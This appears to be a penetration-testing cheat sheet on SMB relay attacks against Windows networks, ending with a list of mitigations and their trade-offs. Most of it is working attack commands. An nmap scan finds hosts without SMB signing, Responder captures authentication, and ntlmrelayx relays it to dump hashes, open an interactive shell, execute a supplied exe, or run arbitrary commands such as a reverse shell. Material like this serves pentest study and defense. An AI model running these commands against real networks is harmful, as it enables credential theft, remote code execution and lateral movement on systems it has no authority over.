SMB Relay

# SMB Relay

**Overview:**
Instead of cracking hashes why not relay those hashes...
Requirements:
- SMB signing must be disabled on target
- Relayed credentials must be admin on machine

**Finding Targets:**
- Nessus 
- nmap
- custom scripts

`nmap --script=smb2-security-mode.nse -p 445 <ipsweep>`

**Tools:**
Responder.py
edit Responder.conf
set: SMB = off
       HTTP = off

`ntlmrelayx.py` 

**Method:**
run: `responder -I <interface> -rdwv`
run: `ntlmrelayx.py -tf targets.txt -smb2support`
This will dump hashes etc

run: `ntlmrelayx.py -tf targets.txt -smb2support -i`
This will give an interactive shell
Look at the ouput for where it started the listener
run: `nc 127.0.0.1 <port>`

run: `ntlmrelayx.py -tf targets.txt -smb2support -e test.exe`
Runs the exe on target

run: `ntlmrelayx.py -tf targets.txt -smb2support -c <command>`
Runs the command(could be a powershell reverse shell)

**Mitigation:**
Enable SMB Signing on all devices
- Pro: Stops attack
- Con: 15% Slower

Disable NTLM Authentication
- Pro: Stops attack
- Con: If Kerberos stops working windows defaults back to NTLM

Account tiering
- Pro: Limits domain admins to specific tasks
- Con: Enforcing the policy may be difficult

Local Admin Restriction:
- Pro: Can prevent lots of lateral movement
- Con: Potential increase the amount of service desk tickets
